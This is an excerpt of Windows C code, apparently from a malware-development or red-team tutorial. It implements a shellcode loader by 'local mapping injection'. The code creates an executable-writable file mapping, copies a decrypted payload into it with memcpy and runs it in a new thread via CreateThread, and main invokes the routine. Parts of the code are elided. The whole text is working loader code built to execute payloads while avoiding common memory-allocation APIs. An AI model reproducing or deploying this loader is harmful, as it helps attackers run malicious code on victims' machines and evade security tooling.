...
BOOL LocalMapInjectExecute(IN PBYTE pPlainText, IN SIZE_T sPlainTextSize, OUT PVOID* ppAddress) {
    BOOL bSTATE = TRUE;
    HANDLE hFileHandle = NULL;
    PVOID pMapAddress = NULL;

    printf("[i] Creating Memory Page For Decrypted Payload...\n");
    // Create a memory page for decrypted payload memory storage
    hFileHandle = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPlainTextSize, NULL);
    if (hFileHandle == NULL) {
        printf("\n\t[!] CreateFileMapping Failed: %d", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[i] Using MapViewOfFile to map the view of the decrypted payload into memory...\n");
    // Maps the view of the decrypted payload
    pMapAddress = MapViewOfFile(hFileHandle, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPlainTextSize);
    if (pMapAddress == NULL) {
        printf("\n\t[!] MapViewOfFile Failed! %d", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }
    printf("\n\t[+] Memory Address at 0x%p \n", pMapAddress);

    printf("[i] Writing payload To Mapped Memory\n");
    memcpy(pMapAddress, pPlainText, sPlainTextSize);

    printf("[+] Press <Enter> To Execute Payload with CreateThread...\n");
    getchar();
    if (CreateThread(NULL, sPlainTextSize, pMapAddress, NULL, 0, NULL) == NULL) {
...
int main() {
    ...
    printf("[i] Executing LocalMapInjectExecute...\n");
    if (!LocalMapInjectExecute(pPlainText, sPlainTextSize, &pMapAddress)) {
        printf("\n\t[!] LocalMapInjectExecute Failed!");
        return 1;
    }
